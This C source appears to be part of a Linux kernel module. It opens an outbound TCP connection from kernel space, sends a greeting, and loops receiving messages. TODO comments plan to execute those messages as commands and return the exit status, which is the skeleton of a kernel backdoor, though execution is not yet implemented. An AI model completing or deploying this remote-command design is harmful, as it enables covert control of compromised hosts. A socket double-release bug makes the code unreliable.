#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>

static struct socket *sock = NULL;
static char *message = "Hello World! from kernel land";

static void *convert(void *ptr)
{
    return ptr;
}

int network_init(const char *ip, int port)
{
    struct sockaddr_in addr = { 0 };
    struct msghdr msg = { 0 };
    struct kvec vec = { 0 };
    unsigned char ip_binary[4] = { 0 };
    int ret = 0;

    pr_info("network: initializing module\n");

    if ((ret = in4_pton(ip, -1, ip_binary, -1, NULL)) == 0)
    {
        pr_err("network: error converting the IPv4 address: %d\n", ret);
        return 1;
    }

    if ((ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0)
    {
        pr_err("network: error creating the socket: %d\n", ret);
        return 1;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    // equivalent to
    // addr.sin_addr.s_addr = *(unsigned int*)ip_binary;
    // without the explicit cast
    // I do not like explicit casts
    memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

    if ((ret = sock->ops->connect(sock, convert(&addr), sizeof(addr), 0)) < 0)
    {
        pr_err("network: error connecting to %s:%d (%d)\n", ip, port, ret);
        sock_release(sock);
        sock = NULL;
        return 1;
    }

    vec.iov_base = message;
    vec.iov_len = strlen(message);

    if ((ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len)) < 0)
    {
        pr_err("network: error sending the message: %d\n", ret);
        sock_release(sock);
        return 1;
    }

    pr_info("network: message '%s' sent to %s:%d\n", message, ip, port);
    return 0;
}

int network_loop(void *data)
{
    int ret = 0;
    struct kvec resp_vec = { 0 };
    struct msghdr resp_msg = { 0 };
    char resp_buf[1024] = { 0 };
    struct kvec status_vec = { 0 };
    struct msghdr status_msg = { 0 };
    char status_buf[15];

    // handle response:
    while (kthread_should_stop() == 0)
    {
        resp_vec.iov_base = resp_buf;
        resp_vec.iov_len = 1023;

        // TODO: recvmsg is blocking and the thread won't stop until it returns:
        if ((ret = kernel_recvmsg(sock, &resp_msg, &resp_vec, 1, 1023, 0)) <= 0)
        {
            pr_info("network: couldn't recv from socket: %d\n", ret);
            return 1;
            /* break; */
        }

        // don't print newline
        if (resp_buf[ret - 1] == '\n')
        {
            resp_buf[ret - 1] = '\0';
        }
        pr_info("network: received message:\n***************\n "
                "'%s'\n***************\n",
                resp_buf);

        // TODO: validate resp_buf's content and interpret it as a cmd to exec
        // ...

        // TODO: send exit status of exec'd cmd back
        sprintf(status_buf, "status: 999\n");
        status_vec.iov_base = status_buf;
        status_vec.iov_len = strlen(status_buf);

        if ((ret = kernel_sendmsg(sock, &status_msg, &status_vec, 1,
                                  status_vec.iov_len))
            < 0)
        {
            pr_err("network: couldn't send exit status back: %d\n", ret);
            return 1;
            /* break; */
        }
    }
    return 0;
}

void network_exit(void)
{
    if (sock)
        sock_release(sock);
    pr_info("network: released socket\n");
}
